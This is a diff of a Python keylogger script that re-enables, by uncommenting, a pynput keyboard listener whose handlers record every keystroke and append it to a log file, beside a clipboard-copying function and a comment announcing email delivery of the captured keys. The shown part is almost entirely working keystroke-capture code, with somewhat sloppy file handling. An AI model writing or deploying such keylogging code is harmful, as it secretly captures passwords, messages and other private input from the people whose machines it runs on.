@@ -74,38 +74,38 @@ def copy_clipboard():
   
   
 
-# def on_press(key):
-#     global keys,counter
-#     print(key)
-#     keys.append(key)
-#     counter+=1
+def on_press(key):
+    global keys,counter
+    print(key)
+    keys.append(key)
+    counter+=1
     
-#     if counter >= 1:
-#         counter = 0
-#         write_to_file(keys)
-#         keys=[]
+    if counter >= 1:
+        counter = 0
+        write_to_file(keys)
+        keys=[]
       
     
-# def write_to_file(keys):
-#     # Open file and append keys pressed
-#     with open(file_path + extend + key_info,"a") as f:
-#         for key in keys:
-#             r=str(key).replace("'", "")
-#             if r.find("space")>0:
-#               f.write('\n')
-#               f.close()
-#             elif r.find("Key")== -1:
-#                 f.write(r)
-#                 f.close()
+def write_to_file(keys):
+    # Open file and append keys pressed
+    with open(file_path + extend + key_info,"a") as f:
+        for key in keys:
+            r=str(key).replace("'", "")
+            if r.find("space")>0:
+              f.write('\n')
+              f.close()
+            elif r.find("Key")== -1:
+                f.write(r)
+                f.close()
                 
             
               
-# def on_release(key):
-#     if key==Key.esc:
-#       return False
+def on_release(key):
+    if key==Key.esc:
+      return False
   
-# with Listener(on_press=on_press,on_release=on_release) as listener:
-#     listener.join()
+with Listener(on_press=on_press,on_release=on_release) as listener:
+    listener.join()
    
         
 # Email Functionality - send keys to email
